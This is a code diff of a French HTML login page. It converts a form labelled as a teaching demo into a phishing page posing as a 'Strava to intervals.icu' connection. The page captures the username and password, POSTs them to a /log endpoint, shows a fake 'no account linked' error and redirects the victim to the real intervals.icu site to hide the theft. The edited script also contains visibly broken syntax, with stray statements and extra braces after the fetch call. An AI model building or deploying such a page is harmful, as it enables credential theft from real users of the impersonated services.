@@ -55,19 +55,19 @@
     }
 
     button:hover {
-      background: #1d4ed8;
+      background: #c32f06;
     }
   </style>
 </head>
 <body>
   <form class="login-box" id="loginForm">
-    <h1>Connexion</h1>
+    <h1>Connexion de Strava à intervals.icu</h1>
 
-    <label for="alias">Adresse mail</label>
-    <input type="text" id="alias" name="alias" required />
+    <label for="username">Adresse mail</label>
+    <input type="text" id="username" name="username" required />
 
-    <label for="code_demo">Mot de passe</label>
-    <input type="password" id="code_demo" name="code_demo" required />
+    <label for="password">Mot de passe</label>
+    <input type="password" id="password" name="password" required />
 
     <button type="submit">Se connecter</button>
   </form>
@@ -77,24 +77,24 @@
     form.addEventListener('submit', function (event) {
       event.preventDefault(); // empêche l'envoi réel du formulaire
 
-      const alias = document.getElementById('alias').value;
-      const codeDemo = document.getElementById('code_demo').value;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
       // Envoi pédagogique vers le serveur (aucune donnée sensible)
       fetch('/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ alias, code_demo: codeDemo })
-      }).then(() => {
-        console.log('Alias :', alias);
-        console.log('Code démo :', codeDemo);
+        body: JSON.stringify({ username, password: password })
+      }).finally(() => {
+        // Redirection après clic sur "Se connecter"
+        window.location.href = "https://intervals.icu";
+      });
+        console.log('Code démo :', password);
       });
 
       // Exemple : message visuel
-      alert('Informations transmises dans le log (console)')
-      meta http-equiv="refresh" content="3; url=https://intervals.icu";
+      alert('Erreur : aucun compte intervals.icu relié à cette adresse');
     });
   </script>
 </body>
 </html>
-
